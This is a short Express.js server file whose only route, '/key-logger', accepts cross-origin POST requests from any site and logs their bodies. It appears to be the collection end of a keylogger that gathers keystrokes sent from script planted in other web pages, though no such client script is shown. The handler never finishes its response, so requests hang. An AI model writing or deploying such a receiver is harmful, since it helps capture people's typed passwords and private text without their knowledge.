const express = require('express');
const cors = require('cors')
const app = express();

// Middleware to disable cors
app.use(cors())

// Middleware to parse JSON bodies
app.use(express.json());

// POST request handler
app.post('/key-logger', (req, res) => {
    console.log(req.body); // Logs the request body to the console
    res.status(200)
});

// Start the server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});